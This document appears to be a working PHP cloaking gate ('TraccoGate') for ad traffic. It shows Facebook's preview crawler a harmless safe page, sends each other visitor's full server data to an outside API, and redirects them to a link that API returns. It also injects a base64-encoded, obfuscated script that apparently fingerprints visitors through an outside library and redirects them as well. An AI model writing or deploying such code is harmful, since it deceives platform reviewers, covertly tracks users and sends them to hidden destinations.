<?php
ini_set('display_errors', '0');
error_reporting(0);
date_default_timezone_set('UTC');

define('TI_TIME', time());
define('TI_FLOW', '5CkXeCl6FL');
define('TI_API', 'https://tracco.online/api/ti/v1/gate');
define('TI_SAFE', 'index2.php');
define('TI_UTM', 'true');

if (!function_exists('getallheaders')) {
    function getallheaders()
    {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) === 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

new TraccoGate();

class TraccoGate
{
    public function __construct()
    {
        try {
            if (!function_exists('curl_version')) {
                throw new Exception('php-curl required');
            }

            $headers = array_change_key_case(getallheaders());
            if (
                (isset($headers['x-purpose']) && $headers['x-purpose'] === 'preview')
                || (isset($headers['x-fb-http-engine']) && $headers['x-fb-http-engine'] === 'liger')
                || isset($headers['tracco-curl'])
            ) {
                $this->safePage();
            }

            if (isset($_POST['hdata'])) {
                $extended = $_POST['hdata'];
                if (is_string($extended)) {
                    $decoded = json_decode($extended, true);
                    if (is_array($decoded)) {
                        $decoded['server'] = [
                            'REMOTE_ADDR' => $_SERVER['REMOTE_ADDR'] ?? '',
                            'HTTP_USER_AGENT' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                            'HTTP_REFERER' => $_SERVER['HTTP_REFERER'] ?? '',
                        ];
                        $decoded['query'] = $_GET;
                        $extended = json_encode($decoded);
                    }
                }
                $this->responser(
                    $this->utmTransfer(
                        json_decode($this->curlSender('extended', $extended), true)
                    )
                );
            }

            new TraccoRedirect(
                $this->utmTransfer(
                    json_decode($this->curlSender('basic', $this->dataCollector()), true)
                )
            );

            echo $this->appendAssets(TraccoHtml::get());
        } catch (Exception $e) {
            $this->safePage();
        }
    }

    private function safePage()
    {
        if (is_file(TI_SAFE)) {
            include TI_SAFE;
            exit;
        }
        header('Location: ' . TI_SAFE, true, 302);
        exit;
    }

    private function utmTransfer($response)
    {
        if (!is_array($response)) {
            return ['status' => 'block', 'link' => TI_SAFE];
        }
        if (($response['status'] ?? '') === 'ok' && !empty($_GET) && TI_UTM === 'true' && !empty($response['link'])) {
            $parsed = parse_url($response['link']);
            $start = empty($parsed['query']) ? '?' : '&';
            $response['link'] = $response['link'] . $start . http_build_query($_GET);
        }
        return $response;
    }

    private function dataCollector()
    {
        $_SERVER['time'] = TI_TIME;
        $_SERVER['flow_hash'] = TI_FLOW;
        array_walk_recursive($_SERVER, function (&$parameter) {
            $parameter = htmlspecialchars((string) $parameter, ENT_QUOTES, 'UTF-8');
        });
        return json_encode([
            'campaign' => TI_FLOW,
            'flow_hash' => TI_FLOW,
            'query' => $_GET,
            'server' => $_SERVER,
        ]);
    }

    private function appendAssets($html)
    {
        if (!preg_match('/<body([^>]*)>/i', $html, $bodyString)) {
            throw new Exception('missing body tag');
        }
        $bodyTag = '<body' . $bodyString[1] . '>';
        return str_replace($bodyTag, $bodyTag . PHP_EOL . $this->assets(), $html);
    }

    private function curlSender($type, $data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
        curl_setopt($ch, CURLOPT_URL, TI_API . '?type=' . urlencode($type));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'data=' . urlencode($data));
        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
        $response = curl_exec($ch);
        if ($response === false) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new Exception('curl: ' . $err);
        }
        curl_close($ch);
        return $response;
    }

    private function responser($response)
    {
        if (!is_array($response)) {
            $response = ['status' => 'block', 'link' => TI_SAFE];
        }
        header('Content-Type: application/json; charset=utf-8');
        exit(json_encode($response));
    }

    private function assets()
    {
        return '<script>' . base64_decode('KGZ1bmN0aW9uKF8weDUyMGI0NyxfMHgxMWZhNmIpe3ZhciBfMHg0MmQ3NjQ9XzB4M2EzMCxfMHgzOTMyNTg9XzB4NTIwYjQ3KCk7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHgxMDk2Yzg9cGFyc2VJbnQoXzB4NDJkNzY0KDB4MjExKSkvMHgxK3BhcnNlSW50KF8weDQyZDc2NCgweDIwZikpLzB4MistcGFyc2VJbnQoXzB4NDJkNzY0KDB4MWZlKSkvMHgzKigtcGFyc2VJbnQoXzB4NDJkNzY0KDB4MjE4KSkvMHg0KStwYXJzZUludChfMHg0MmQ3NjQoMHgxZjApKS8weDUrLXBhcnNlSW50KF8weDQyZDc2NCgweDIxNCkpLzB4NioocGFyc2VJbnQoXzB4NDJkNzY0KDB4MjBjKSkvMHg3KSstcGFyc2VJbnQoXzB4NDJkNzY0KDB4MWY5KSkvMHg4Ky1wYXJzZUludChfMHg0MmQ3NjQoMHgyMDcpKS8weDk7aWYoXzB4MTA5NmM4PT09XzB4MTFmYTZiKWJyZWFrO2Vsc2UgXzB4MzkzMjU4WydwdXNoJ10oXzB4MzkzMjU4WydzaGlmdCddKCkpO31jYXRjaChfMHg0ZGQ2NzMpe18weDM5MzI1OFsncHVzaCddKF8weDM5MzI1OFsnc2hpZnQnXSgpKTt9fX0oXzB4NGFiNywweGFhOTZlKSwoZnVuY3Rpb24oKXt2YXIgXzB4NDk2NzQ1PV8weDNhMzAsXzB4NTQ5YWI4PXsnYVBaVVEnOmZ1bmN0aW9uKF8weGNjYTBlYSxfMHg0ZGVmYjMpe3JldHVybiBfMHhjY2EwZWE9PT1fMHg0ZGVmYjM7fSwnaWVwRU4nOmZ1bmN0aW9uKF8weDI3Zjg4OCxfMHgyZjU1OTMpe3JldHVybiBfMHgyN2Y4ODgrXzB4MmY1NTkzO30sJ2laTkhoJzpmdW5jdGlvbihfMHgyMDU4NWEsXzB4ZDU0M2M4KXtyZXR1cm4gXzB4MjA1ODVhIT09XzB4ZDU0M2M4O30sJ2xMWkJ3JzpmdW5jdGlvbihfMHg0NmNkZGQsXzB4MjFlMTA3KXtyZXR1cm4gXzB4NDZjZGRkK18weDIxZTEwNzt9LCdhaXlQWCc6ZnVuY3Rpb24oXzB4NDNhNjE5LF8weDFkNGYxNCl7cmV0dXJuIF8weDQzYTYxOShfMHgxZDRmMTQpO30sJ0xIZHlCJzpfMHg0OTY3NDUoMHgyMDQpLCd1UUl1bic6ZnVuY3Rpb24oXzB4NDU3NjMxLF8weDU4YjY4ZCl7cmV0dXJuIF8weDQ1NzYzMT5fMHg1OGI2OGQ7fSwnRFFpcHknOmZ1bmN0aW9uKF8weDRjNWE0Mil7cmV0dXJuIF8weDRjNWE0MigpO30sJ1VGVGZPJzpfMHg0OTY3NDUoMHgxZjMpLCdobmR1aSc6XzB4NDk2NzQ1KDB4MjE2KSwna2pyWWonOmZ1bmN0aW9uKF8weDViNjdkYyxfMHg0YjFhYTgpe3JldHVybiBfMHg1YjY3ZGMrXzB4NGIxYWE4O30sJ3BEcE1EJzpmdW5jdGlvbihfMHgzYzVjNDEsXzB4NDk0NDY3KXtyZXR1cm4gXzB4M2M1YzQxKF8weDQ5NDQ2Nyk7fSwnQ1JrYlknOl8weDQ5Njc0NSgweDFmNCksJ2FtdWdWJzpfMHg0OTY3NDUoMHgyMTMpfSxfMHg0ZmU3YmY9XzB4NTQ5YWI4W18weDQ5Njc0NSgweDIxNSldLF8weDI4MGYyYj1fMHg1NDlhYjhbJ2FtdWdWJ107ZnVuY3Rpb24gXzB4M2I0YzIzKCl7dmFyIF8weDQyNzU0MT1fMHg0OTY3NDU7dHJ5e3ZhciBfMHg1MTlmZDY9bG9jYXRpb25bXzB4NDI3NTQxKDB4MWYxKV18fCcnO2xvY2F0aW9uW18weDQyNzU0MSgweDIwMyldKF8weDUxOWZkNiYmXzB4NTQ5YWI4W18weDQyNzU0MSgweDIxNyldKF8weDI4MGYyYlsnaW5kZXhPZiddKCc/JyksLTB4MSk/XzB4NTQ5YWI4W18weDQyNzU0MSgweDFmYSldKF8weDI4MGYyYixfMHg1MTlmZDYpOl8weDUxOWZkNiYmXzB4NTQ5YWI4WydpWk5IaCddKF8weDI4MGYyYltfMHg0Mjc1NDEoMHgxZjUpXSgnPycpLC0weDEpP18weDU0OWFiOFtfMHg0Mjc1NDEoMHgxZmEpXShfMHg1NDlhYjhbXzB4NDI3NTQxKDB4MWYyKV0oXzB4MjgwZjJiLCcmJyksXzB4NTE5ZmQ2WydzbGljZSddKDB4MSkpOl8weDI4MGYyYik7fWNhdGNoKF8weDMzZTcwMSl7bG9jYXRpb25bXzB4NDI3NTQxKDB4MjAzKV0oXzB4MjgwZjJiKTt9fWZ1bmN0aW9uIF8weDUyNGM4NyhfMHg0ZGYxNTkpe3ZhciBfMHgyNDI2OTA9XzB4NDk2NzQ1LF8weDViNDU2Yj1fMHg1NDlhYjhbXzB4MjQyNjkwKDB4MjEyKV1bXzB4MjQyNjkwKDB4MjFhKV0oJ3wnKSxfMHg0MmUxMzk9MHgwO3doaWxlKCEhW10pe3N3aXRjaChfMHg1YjQ1NmJbXzB4NDJlMTM5KytdKXtjYXNlJzAnOnRyeXtfMHg0OTIyZWI9SW50bFtfMHgyNDI2OTAoMHgyMDgpXSgpWydyZXNvbHZlZE9wdGlvbnMnXSgpWyd0aW1lWm9uZSddfHwnJzt9Y2F0Y2goXzB4ODEwYTY1KXt9Y29udGludWU7Y2FzZScxJzp0cnl7XzB4NDBlY2U1PV8weDU0OWFiOFtfMHgyNDI2OTAoMHgxZjcpXShOdW1iZXIsbmF2aWdhdG9yWydtYXhUb3VjaFBvaW50cyddKXx8MHgwLF8weDQ1MmU3Yj1fMHg1NDlhYjhbJ3VRSXVuJ10oXzB4NDBlY2U1LDB4MCl8fF8weDI0MjY5MCgweDFmZilpbiB3aW5kb3c7fWNhdGNoKF8weDEzN2ZjZCl7fWNvbnRpbnVlO2Nhc2UnMic6dmFyIF8weDQ5MjJlYj0nJyxfMHgyYjI2OTE9JycsXzB4NDU5OTUyPScnLF8weDQ1MmU3Yj0hW10sXzB4NDBlY2U1PTB4MDtjb250aW51ZTtjYXNlJzMnOnZhciBfMHgyZjJkNGM9eydHWmxoZic6ZnVuY3Rpb24oXzB4MWUyMDVmLF8weDFmZmQzMCl7cmV0dXJuIF8weDFlMjA1Zj09PV8weDFmZmQzMDt9LCduRm9sQSc6ZnVuY3Rpb24oXzB4MTgxOTM4KXt2YXIgXzB4MzJjNGNkPV8weDI0MjY5MDtyZXR1cm4gXzB4NTQ5YWI4W18weDMyYzRjZCgweDIwMCldKF8weDE4MTkzOCk7fX07Y29udGludWU7Y2FzZSc0Jzp0cnl7XzB4MmIyNjkxPW5hdmlnYXRvclsnbGFuZ3VhZ2UnXXx8Jyc7fWNhdGNoKF8weDI4ZmNlMCl7fWNvbnRpbnVlO2Nhc2UnNSc6dmFyIF8weDI0MDI3NT17fTtjb250aW51ZTtjYXNlJzYnOl8weDE5NGRkMFtfMHgyNDI2OTAoMHgxZWYpXShfMHg1NDlhYjhbXzB4MjQyNjkwKDB4MjA2KV0sSlNPTlsnc3RyaW5naWZ5J10oeydmbG93JzpfMHg0ZmU3YmYsJ3Zpc2l0b3JJZCc6XzB4NGRmMTU5fHwnJywndGltZXpvbmUnOl8weDQ5MjJlYiwnbGFuZ3VhZ2UnOl8weDJiMjY5MSwnc2NyZWVuUmVzb2x1dGlvbic6XzB4NDU5OTUyLCd0b3VjaENhcGFibGUnOl8weDQ1MmU3YiwnbWF4VG91Y2hQb2ludHMnOl8weDQwZWNlNSwncGFnZVVybCc6bG9jYXRpb25bXzB4MjQyNjkwKDB4MjE5KV0sJ3JlZmVycmVyJzpkb2N1bWVudFtfMHgyNDI2OTAoMHgyMGUpXXx8JycsJ3F1ZXJ5JzpfMHgyNDAyNzV9KSk7Y29udGludWU7Y2FzZSc3JzpmZXRjaChsb2NhdGlvbltfMHgyNDI2OTAoMHgyMDkpXStsb2NhdGlvblsnc2VhcmNoJ10seydtZXRob2QnOl8weDI0MjY5MCgweDIxZSksJ2hlYWRlcnMnOnsnQ29udGVudC1UeXBlJzpfMHg1NDlhYjhbXzB4MjQyNjkwKDB4MjA1KV19LCdib2R5JzpfMHgxOTRkZDBbXzB4MjQyNjkwKDB4MjAxKV0oKSwnY3JlZGVudGlhbHMnOl8weDI0MjY5MCgweDFmZCl9KVtfMHgyNDI2OTAoMHgyMTApXShmdW5jdGlvbihfMHgyZGViZDApe3ZhciBfMHg0NmY2ZDc9XzB4MjQyNjkwO3JldHVybiBfMHgyZGViZDBbXzB4NDZmNmQ3KDB4MjBiKV0oKTt9KVsndGhlbiddKGZ1bmN0aW9uKF8weGIxOGU1Mil7dmFyIF8weGE2NmU0ND1fMHgyNDI2OTA7aWYoXzB4YjE4ZTUyJiZfMHgyZjJkNGNbXzB4YTY2ZTQ0KDB4MjFjKV0oXzB4YjE4ZTUyWydzdGF0dXMnXSwnb2snKSYmXzB4YjE4ZTUyWydsaW5rJ10pe2xvY2F0aW9uWydyZXBsYWNlJ10oXzB4YjE4ZTUyW18weGE2NmU0NCgweDFmOCldKTtyZXR1cm47fV8weDJmMmQ0Y1tfMHhhNjZlNDQoMHgyMDIpXShfMHgzYjRjMjMpO30pW18weDI0MjY5MCgweDFmYildKF8weDNiNGMyMyk7Y29udGludWU7Y2FzZSc4Jzp0cnl7bG9jYXRpb25bXzB4MjQyNjkwKDB4MWYxKV1bXzB4MjQyNjkwKDB4MjFkKV0oMHgxKVtfMHgyNDI2OTAoMHgyMWEpXSgnJicpWydmb3JFYWNoJ10oZnVuY3Rpb24oXzB4NWExMzc5KXt2YXIgXzB4YzkwZWMyPV8weDI0MjY5MCxfMHgxYzI3Nzk9XzB4NWExMzc5W18weGM5MGVjMigweDIxYSldKCc9Jyk7aWYoXzB4MWMyNzc5WzB4MF0pXzB4MjQwMjc1W18weDU0OWFiOFsnYWl5UFgnXShkZWNvZGVVUklDb21wb25lbnQsXzB4MWMyNzc5WzB4MF0pXT1kZWNvZGVVUklDb21wb25lbnQoXzB4MWMyNzc5WzB4MV18fCcnKTt9KTt9Y2F0Y2goXzB4MjhmMWU3KXt9Y29udGludWU7Y2FzZSc5Jzp2YXIgXzB4MTk0ZGQwPW5ldyBVUkxTZWFyY2hQYXJhbXMoKTtjb250aW51ZTtjYXNlJzEwJzp0cnl7aWYoc2NyZWVuKV8weDQ1OTk1Mj1fMHg1NDlhYjhbXzB4MjQyNjkwKDB4MWY2KV0oc2NyZWVuWyd3aWR0aCddKyd4JyxzY3JlZW5bJ2hlaWdodCddKTt9Y2F0Y2goXzB4NTQ3OWQ4KXt9Y29udGludWU7fWJyZWFrO319dHJ5e2ltcG9ydCgnaHR0cHM6Ly9vcGVuZnBjZG4uaW8vZmluZ2VycHJpbnRqcy92NScpW18weDQ5Njc0NSgweDIxMCldKGZ1bmN0aW9uKF8weDMzN2NmZil7dmFyIF8weDM2MDY5ZT1fMHg0OTY3NDU7cmV0dXJuIF8weDMzN2NmZltfMHgzNjA2OWUoMHgyMWIpXSgpO30pW18weDQ5Njc0NSgweDIxMCldKGZ1bmN0aW9uKF8weDM1OTdmNil7dmFyIF8weDMxOGRjND1fMHg0OTY3NDU7cmV0dXJuIF8weDM1OTdmNltfMHgzMThkYzQoMHgyMGQpXSgpO30pW18weDQ5Njc0NSgweDIxMCldKGZ1bmN0aW9uKF8weDQwYWI1Yil7dmFyIF8weDE2MGZhMT1fMHg0OTY3NDU7XzB4NTQ5YWI4W18weDE2MGZhMSgweDFmNyldKF8weDUyNGM4NyxfMHg0MGFiNWJbXzB4MTYwZmExKDB4MWZjKV18fCcnKTt9KVtfMHg0OTY3NDUoMHgxZmIpXShmdW5jdGlvbigpe3ZhciBfMHgxZWFkYjA9XzB4NDk2NzQ1O18weDU0OWFiOFtfMHgxZWFkYjAoMHgyMGEpXShfMHg1MjRjODcsJycpO30pO31jYXRjaChfMHg1ZWQ4MzMpe18weDUyNGM4NygnJyk7fX0oKSkpO2Z1bmN0aW9uIF8weDNhMzAoXzB4MTE1ZjQ5LF8weDI2N2RhZCl7XzB4MTE1ZjQ5PV8weDExNWY0OS0weDFlZjt2YXIgXzB4NGFiNzU4PV8weDRhYjcoKTt2YXIgXzB4M2EzMDQ4PV8weDRhYjc1OFtfMHgxMTVmNDldO2lmKF8weDNhMzBbJ0F5SVVVaiddPT09dW5kZWZpbmVkKXt2YXIgXzB4MjFiMmVlPWZ1bmN0aW9uKF8weDNiYTY5Yil7dmFyIF8weDUzYjE2Yz0nYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkrLz0nO3ZhciBfMHhjOWEyZDA9JycsXzB4MjY0OWVjPScnO2Zvcih2YXIgXzB4Mjk2NTk2PTB4MCxfMHhiYzQ0MjIsXzB4NWVmYjgxLF8weDNkYzJmNj0weDA7XzB4NWVmYjgxPV8weDNiYTY5YlsnY2hhckF0J10oXzB4M2RjMmY2KyspO35fMHg1ZWZiODEmJihfMHhiYzQ0MjI9XzB4Mjk2NTk2JTB4ND9fMHhiYzQ0MjIqMHg0MCtfMHg1ZWZiODE6XzB4NWVmYjgxLF8weDI5NjU5NisrJTB4NCk/XzB4YzlhMmQwKz1TdHJpbmdbJ2Zyb21DaGFyQ29kZSddKDB4ZmYmXzB4YmM0NDIyPj4oLTB4MipfMHgyOTY1OTYmMHg2KSk6MHgwKXtfMHg1ZWZiODE9XzB4NTNiMTZjWydpbmRleE9mJ10oXzB4NWVmYjgxKTt9Zm9yKHZhciBfMHgzYTBhYjc9MHgwLF8weDMwMTE2Nj1fMHhjOWEyZDBbJ2xlbmd0aCddO18weDNhMGFiNzxfMHgzMDExNjY7XzB4M2EwYWI3Kyspe18weDI2NDllYys9JyUnKygnMDAnK18weGM5YTJkMFsnY2hhckNvZGVBdCddKF8weDNhMGFiNylbJ3RvU3RyaW5nJ10oMHgxMCkpWydzbGljZSddKC0weDIpO31yZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KF8weDI2NDllYyk7fTtfMHgzYTMwWydkTXFiT3knXT1fMHgyMWIyZWUsXzB4M2EzMFsnclVJQVBWJ109e30sXzB4M2EzMFsnQXlJVVVqJ109ISFbXTt9dmFyIF8weDE2NDE4Mz1fMHg0YWI3NThbMHgwXSxfMHgzNzQwNzg9XzB4MTE1ZjQ5K18weDE2NDE4MyxfMHg0NDg3MDM9XzB4M2EzMFsnclVJQVBWJ11bXzB4Mzc0MDc4XTtyZXR1cm4hXzB4NDQ4NzAzPyhfMHgzYTMwNDg9XzB4M2EzMFsnZE1xYk95J10oXzB4M2EzMDQ4KSxfMHgzYTMwWydyVUlBUFYnXVtfMHgzNzQwNzhdPV8weDNhMzA0OCk6XzB4M2EzMDQ4PV8weDQ0ODcwMyxfMHgzYTMwNDg7fWZ1bmN0aW9uIF8weDRhYjcoKXt2YXIgXzB4NTYxZWQwPVsnQ012TXp4all6eGknLCdtSmVYbVpiaXlLenhCM2EnLCdEZ0hMQkcnLCduZEM0bVptWHVLRG91ZkR6JywndGVIS0V1aScsJ0F3NUt6eEdZbE5iT0NhJywnbVpDWG5lZmNzMjVadmEnLCdxMWpSeUxLJywneXhiV0JnTEp5eHJQQjI0VkVjMTNEM0NUek05WUJzMTFDTVhMQk1uVnpndksnLCd5dmJBdnZlJywnbmRDWG10ZVluZUQwdjI1ZXpHJywnQWhqTHpHJywnQzNiU0F4cScsJ0JnOUh6YScsJ3IxUFNBZ3knLCdDMlhQeTJ1JywndWU5dHZhJywnQzJ2MCcsJ210bTJtSm0xbWZ6S0R2SFJ1cScsJ0MydkhDTW5PJywnQmVYQXFOQycsJ0FnckhEZ2UnLCdudW5Sd2d2ZEJkemd0YScsJ0F3NUt6eEhwekcnLCdBMlBZd3dPJywneXdMNXVmRycsJ0JnTFVBVycsJ25kYTNuZEszbk1QNXNnek5BcScsJ0F3dldydTQnLCd5MmYweTJHJywnRE1MWkF4clZDS0xLJywnQzJmVHpzMVZDTUxOQXc0JywnbTJyUXN3clR2cScsJ0IyNTBCM3ZKQWhuMHl4ajAnLCdyZmZQQ2hLJywnRGc5dERoalBCTUMnLCdCS3pWQmVlJywnQ012V0JnZkp6cScsJ20zV1lGZGI4bmhXWG1oV1hGZHY4b2hXNUZkejhuVycsJ0FnNUtEd0snLCd2dXp1eks4JywnbVpxM25KbVltTVBiRHhMenJHJywncmdmMHp2clBCd3ZnQjNqVHl4cScsJ0NnZjBBZzVIQnd1JywnQ2VyV3R1cScsJ0FOblZCRycsJ21aRzVveHpNcmhyQXdHJywnejJ2MCddO18weDRhYjc9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NTYxZWQwO307cmV0dXJuIF8weDRhYjcoKTt9') . '</script>';
    }
}

class TraccoHtml
{
    public static function get()
    {
        if (!file_exists(TI_SAFE)) {
            throw new Exception('Safe page missing: ' . TI_SAFE);
        }
        $content = file_get_contents(TI_SAFE);
        if (!preg_match('/<body([^>]*)>/i', $content) || preg_match('/<\?php/i', $content)) {
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $url = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['REQUEST_URI'] ?? '/');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['TRACCO-CURL: true']);
            $html = curl_exec($ch);
            curl_close($ch);
            if (!$html) {
                throw new Exception('failed to load safe page');
            }
            return $html;
        }
        return $content;
    }
}

class TraccoRedirect
{
    public function __construct($response)
    {
        if (is_array($response) && ($response['status'] ?? '') === 'ok' && !empty($response['link'])) {
            header('Location: ' . $response['link'], true, 302);
            exit;
        }
    }
}
